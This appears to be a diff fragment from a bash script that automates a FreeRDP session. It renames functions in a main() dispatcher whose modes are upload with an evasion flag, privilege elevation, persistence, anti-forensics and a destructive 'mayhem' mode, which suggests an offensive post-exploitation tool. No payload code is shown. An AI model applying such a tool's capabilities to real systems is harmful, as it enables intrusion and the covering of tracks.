+    if [[ (-z "${WINDOWNAME}" || "${WINDOWNAME}" == "freerdp") && -n $(get_window_sync_id "${WINDOWNAME}") ]]
     then
         WINDOWNAME="FreeRDP"
-    elif [[ (-n "${WINDOWNAME}" && "${WINDOWNAME}" != "freerdp") && -n $(GetWindowSyncID "${WINDOWNAME}") ]]
+    elif [[ (-n "${WINDOWNAME}" && "${WINDOWNAME}" != "freerdp") && -n $(get_window_sync_id "${WINDOWNAME}") ]]
     then
 		WINDOWNAME="${WINDOWNAME}"
     else
@@ -1255,11 +1364,11 @@ function main() {
         then
             METHOD="none"
         fi
-        Execute "${COMMAND}" "${METHOD}"
+        execute "${COMMAND}" "${METHOD}"
     elif [[ -f "${COMMAND}" ]]
     then
         # Check if a file is passed as input then execute commands
-        Automate "${COMMAND}"
+        automate "${COMMAND}"
     fi
 
     # When the input for selecting an operating system is empty
@@ -1275,19 +1384,19 @@ function main() {
 
     if [[ -f "${INPUT}" && -n "${OUTPUT}" ]]
     then
-        Upload "${INPUT}" "${OUTPUT}" "${PLATFORM}" "${METHOD}" "${ACTION}" "${EVASION}"
+        upload "${INPUT}" "${OUTPUT}" "${PLATFORM}" "${METHOD}" "${ACTION}" "${EVASION}"
     elif [[ "${METHOD}" == "elevate" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
     then
-        Elevate "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        elevate "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
     elif [[ "${METHOD}" == "persistence" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
     then
-        Persistence "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        persistence "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
     elif [[ "${METHOD}" == "antiforensics" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
     then
-        AntiForensics "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        antiforensics "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
     elif [[ "${METHOD}" == "mayhem" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
     then
-        Mayhem "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        mayhem "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
     fi
 }
 
